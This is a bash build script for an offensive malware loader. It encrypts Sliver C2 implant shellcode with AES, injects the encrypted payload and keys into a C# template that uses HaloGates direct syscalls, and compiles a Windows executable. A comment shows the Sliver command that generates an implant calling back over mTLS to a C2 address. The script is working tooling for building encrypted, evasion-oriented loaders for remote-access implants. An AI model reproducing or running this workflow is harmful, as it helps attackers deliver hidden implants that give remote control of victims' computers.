#!/bin/bash

## Version 0.3, using HaloGates for direct syscalls
## Using sliver shellcode directly without donut
## Using AES for shellcode encryption and decryption

mkdir tmp
mkdir output

### To Generate a Sliver implant shellcode without obfuscation:
# [server] sliver > generate -N sliver --mtls 10.0.0.145 -b 10.0.0.145 --skip-symbols -f shellcode --save /root/Codes/c2loader/input/
# [*] Generating new windows/amd64 implant binary
# [!] Symbol obfuscation is disabled
# [*] Build completed in 00:01:25
# [*] Implant saved to /root/Codes/c2loader/input/sliver.bin
#
### Move the sliver.bin to folder input if required, then run the autogen script.

### Currently only 64bit has been tested
### Put the raw shellcode bin file into folder Input
### Fill in the following three required parameters

arch="x64"
c2type="sliver"
rawscfilename='sliver.bin'

### Above are required parameters

rawscfilename_enc=$rawscfilename'.enc'
final_cs_filename='haloc2loader_'$c2type'.cs'
final_exe_filename='haloc2loader_'$c2type'_'$arch'.exe'

sleep 2

# copy the cs template file
cp haloloader_template.txt tmp/$final_cs_filename
# compile the AES encryptor
mono-csc -out:encryptor.exe -platform:x64 encryptor.cs
# encrypt the shellcode payload
mono encryptor.exe input/$rawscfilename tmp/$rawscfilename_enc | tee tmp/enc_output.txt

encpayload=$(cat tmp/enc_output.txt | grep 'Encrypted' | cut -d ' ' -f 2)
encpayloadlength=$(cat tmp/enc_output.txt | grep 'PayloadLength' | cut -d ':' -f 2)
aeskey=$(cat tmp/enc_output.txt | grep 'AES_Key' | cut -d ':' -f 2)
aesiv=$(cat tmp/enc_output.txt | grep 'AES_IV' | cut -d ':' -f 2)

if [ $arch = 'x64' ]
then
    sed -i 's|{{TARGETARCH}}|true|g' tmp/$final_cs_filename
fi

if [ $arch = 'x86' ]
then
    sed -i 's|{{TARGETARCH}}|false|g' tmp/$final_cs_filename
fi
sleep 1
sed -i 's|{{AESKEY}}|'$aeskey'|g' tmp/$final_cs_filename
sleep 1
sed -i 's|{{AESIV}}|'$aesiv'|g' tmp/$final_cs_filename
sleep 1
sed -i 's|{{PAYLOADLENGTH}}|'$encpayloadlength'|g' tmp/$final_cs_filename
sleep 1
#sed -i 's|{{ENCSHELLCODEPAYLOAD}}|'$encpayload'|g' tmp/$final_cs_filename
sed -i '' -f /dev/stdin tmp/$final_cs_filename << EOF
s/{{ENCSHELLCODEPAYLOAD}}/$encpayload/g
EOF
sleep 1

# compile the final exe output
mono-csc -out:output/$final_exe_filename -platform:$arch -unsafe tmp/$final_cs_filename
